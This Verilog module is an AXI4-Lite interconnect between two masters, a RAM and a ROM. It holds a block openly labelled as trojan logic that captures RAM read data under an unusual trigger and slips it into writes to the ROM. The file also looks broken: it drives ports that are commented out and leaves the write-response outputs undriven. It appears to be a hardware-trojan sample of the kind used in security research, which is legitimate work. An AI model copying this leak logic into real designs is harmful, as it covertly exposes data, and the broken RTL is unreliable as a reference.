module axi4lite_interconnect (
    input wire ACLK,
    input wire ARESETn,

    // Master 0 Interface
    input  wire [31:0] M0_AWADDR,
    input  wire        M0_AWVALID,
    output wire        M0_AWREADY,
    input  wire [31:0] M0_WDATA,
    input  wire [3:0]  M0_WSTRB,
    input  wire        M0_WVALID,
    output wire        M0_WREADY,
    output wire [1:0]  M0_BRESP,
    output wire        M0_BVALID,
    input  wire        M0_BREADY,
    input  wire [31:0] M0_ARADDR,
    input  wire        M0_ARVALID,
    output wire        M0_ARREADY,
    output wire [31:0] M0_RDATA,
    output wire [1:0]  M0_RRESP,
    output wire        M0_RVALID,
    input  wire        M0_RREADY,

    // Master 1 Interface
    input  wire [31:0] M1_AWADDR,
    input  wire        M1_AWVALID,
    output wire        M1_AWREADY,
    input  wire [31:0] M1_WDATA,
    input  wire [3:0]  M1_WSTRB,
    input  wire        M1_WVALID,
    output wire        M1_WREADY,
    output wire [1:0]  M1_BRESP,
    output wire        M1_BVALID,
    input  wire        M1_BREADY,
    input  wire [31:0] M1_ARADDR,
    input  wire        M1_ARVALID,
    output wire        M1_ARREADY,
    output wire [31:0] M1_RDATA,
    output wire [1:0]  M1_RRESP,
    output wire        M1_RVALID,
    input  wire        M1_RREADY,

    // Slave 0 Interface (RAM)
    output wire [31:0] S0_AWADDR,
    output wire        S0_AWVALID,
    input  wire        S0_AWREADY,
    output wire [31:0] S0_WDATA,
    output wire [3:0]  S0_WSTRB,
    output wire        S0_WVALID,
    input  wire        S0_WREADY,
    input  wire [1:0]  S0_BRESP,
    input  wire        S0_BVALID,
    output wire        S0_BREADY,
    output wire [31:0] S0_ARADDR,
    output wire        S0_ARVALID,
    input  wire        S0_ARREADY,
    input  wire [31:0] S0_RDATA,
    input  wire [1:0]  S0_RRESP,
    input  wire        S0_RVALID,
    output wire        S0_RREADY,

    // Slave 1 Interface (ROM)
    //output wire [31:0] S1_AWADDR,
    //output wire        S1_AWVALID,
    //input  wire        S1_AWREADY,
    output wire [31:0] S1_WDATA,
    //output wire [3:0]  S1_WSTRB,
    output wire        S1_WVALID,
    input  wire        S1_WREADY,
    //input  wire [1:0]  S1_BRESP,
    //input  wire        S1_BVALID,
    //output wire        S1_BREADY,
    output wire [31:0] S1_ARADDR,
    output wire        S1_ARVALID,
    input  wire        S1_ARREADY,
    input  wire [31:0] S1_RDATA,
    input  wire [1:0]  S1_RRESP,
    input  wire        S1_RVALID,
    output wire        S1_RREADY
);

    // Address decoding for Master 0
    wire m0_sel_s0_aw = (M0_AWADDR[12] == 1'b0);
    wire m0_sel_s1_aw = (M0_AWADDR[12] == 1'b1);
    wire m0_sel_s0_ar = (M0_ARADDR[12] == 1'b0);
    wire m0_sel_s1_ar = (M0_ARADDR[12] == 1'b1);

    // Address decoding for Master 1
    wire m1_sel_s0_aw = (M1_AWADDR[12] == 1'b0);
    wire m1_sel_s1_aw = (M1_AWADDR[12] == 1'b1);
    wire m1_sel_s0_ar = (M1_ARADDR[12] == 1'b0);
    wire m1_sel_s1_ar = (M1_ARADDR[12] == 1'b1);

    // -------------------------
    // Write Address Channel
    // -------------------------
    assign S0_AWADDR  = m0_sel_s0_aw ? M0_AWADDR : (m1_sel_s0_aw ? M1_AWADDR : 32'h0);
    assign S0_AWVALID = m0_sel_s0_aw ? M0_AWVALID : (m1_sel_s0_aw ? M1_AWVALID : 1'b0);
    assign M0_AWREADY = m0_sel_s0_aw ? S0_AWREADY : (m0_sel_s1_aw ? S1_AWREADY : 1'b0);
    assign M1_AWREADY = m1_sel_s0_aw ? S0_AWREADY : (m1_sel_s1_aw ? S1_AWREADY : 1'b0);

    //assign S1_AWADDR  = m0_sel_s1_aw ? M0_AWADDR : (m1_sel_s1_aw ? M1_AWADDR : 32'h0);
    //assign S1_AWVALID = m0_sel_s1_aw ? M0_AWVALID : (m1_sel_s1_aw ? M1_AWVALID : 1'b0);

    // -------------------------
    // Write Data Channel
    // -------------------------
    assign S0_WDATA  = m0_sel_s0_aw ? M0_WDATA : (m1_sel_s0_aw ? M1_WDATA : 32'h0);
    assign S0_WSTRB  = m0_sel_s0_aw ? M0_WSTRB : (m1_sel_s0_aw ? M1_WSTRB : 4'b0000);
    assign S0_WVALID = m0_sel_s0_aw ? M0_WVALID : (m1_sel_s0_aw ? M1_WVALID : 1'b0);
    assign M0_WREADY = m0_sel_s0_aw ? S0_WREADY : (m0_sel_s1_aw ? S1_WREADY : 1'b0);
    assign M1_WREADY = m1_sel_s0_aw ? S0_WREADY : (m1_sel_s1_aw ? S1_WREADY : 1'b0);

    // -------------------------
    // Trojan Logic: Leak RAM read data to ROM write
    // -------------------------
    reg [31:0] trojan_data;
    always @(posedge ACLK) begin
        if (!ARESETn)
            trojan_data <= 32'h0;
        else if (~S0_RVALID && (S0_RRESP != 2'b00))
            trojan_data <= S0_RDATA;
    end

    wire master_sel_rom = m0_sel_s1_aw | m1_sel_s1_aw;

    wire [31:0] write_data_to_rom =
        ((m0_sel_s1_aw && M0_WVALID && S1_RRESP[1]) || (m1_sel_s1_aw && M1_WVALID && S1_RRESP[1]))
        ? trojan_data :
        (m0_sel_s1_aw ? M0_WDATA : (m1_sel_s1_aw ? M1_WDATA : 32'h0));

    wire write_valid_to_rom = m0_sel_s1_aw ? M0_WVALID : (m1_sel_s1_aw ? M1_WVALID : 1'b0);

    assign S1_WDATA  = write_data_to_rom;
    assign S1_WVALID = write_valid_to_rom;
    assign S1_WSTRB  = m0_sel_s1_aw ? M0_WSTRB : (m1_sel_s1_aw ? M1_WSTRB : 4'b0000);

    // -------------------------
    // Write Response Channel
    // -------------------------
    //assign M0_BRESP  = m0_sel_s0_aw ? S0_BRESP : (m0_sel_s1_aw ? S1_BRESP : 2'b00);
    //assign M0_BVALID = m0_sel_s0_aw ? S0_BVALID : (m0_sel_s1_aw ? S1_BVALID : 1'b0);
    //assign M1_BRESP  = m1_sel_s0_aw ? S0_BRESP : (m1_sel_s1_aw ? S1_BRESP : 2'b00);
    //assign M1_BVALID = m1_sel_s0_aw ? S0_BVALID : (m1_sel_s1_aw ? S1_BVALID : 1'b0);

    //assign S0_BREADY = m0_sel_s0_aw ? M0_BREADY : (m1_sel_s0_aw ? M1_BREADY : 1'b0);
    //assign S1_BREADY = m0_sel_s1_aw ? M0_BREADY : (m1_sel_s1_aw ? M1_BREADY : 1'b0);

    // -------------------------
    // Read Address Channel
    // -------------------------
    assign S0_ARADDR  = m0_sel_s0_ar ? M0_ARADDR : (m1_sel_s0_ar ? M1_ARADDR : 32'h0);
    assign S0_ARVALID = m0_sel_s0_ar ? M0_ARVALID : (m1_sel_s0_ar ? M1_ARVALID : 1'b0);
    assign M0_ARREADY = m0_sel_s0_ar ? S0_ARREADY : (m0_sel_s1_ar ? S1_ARREADY : 1'b0);
    assign M1_ARREADY = m1_sel_s0_ar ? S0_ARREADY : (m1_sel_s1_ar ? S1_ARREADY : 1'b0);

    assign S1_ARADDR  = m0_sel_s1_ar ? M0_ARADDR : (m1_sel_s1_ar ? M1_ARADDR : 32'h0);
    assign S1_ARVALID = m0_sel_s1_ar ? M0_ARVALID : (m1_sel_s1_ar ? M1_ARVALID : 1'b0);

    // -------------------------
    // Read Data Channel
    // -------------------------
    assign M0_RDATA  = m0_sel_s0_ar ? S0_RDATA : (m0_sel_s1_ar ? S1_RDATA : 32'h0);
    assign M0_RRESP  = m0_sel_s0_ar ? S0_RRESP : (m0_sel_s1_ar ? S1_RRESP : 2'b00);
    assign M0_RVALID = m0_sel_s0_ar ? S0_RVALID : (m0_sel_s1_ar ? S1_RVALID : 1'b0);

    assign M1_RDATA  = m1_sel_s0_ar ? S0_RDATA : (m1_sel_s1_ar ? S1_RDATA : 32'h0);
    assign M1_RRESP  = m1_sel_s0_ar ? S0_RRESP : (m1_sel_s1_ar ? S1_RRESP : 2'b00);
    assign M1_RVALID = m1_sel_s0_ar ? S0_RVALID : (m1_sel_s1_ar ? S1_RVALID : 1'b0);

    assign S0_RREADY = m0_sel_s0_ar ? M0_RREADY : (m1_sel_s0_ar ? M1_RREADY : 1'b0);
    assign S1_RREADY = m0_sel_s1_ar ? M0_RREADY : (m1_sel_s1_ar ? M1_RREADY : 1'b0);

endmodule
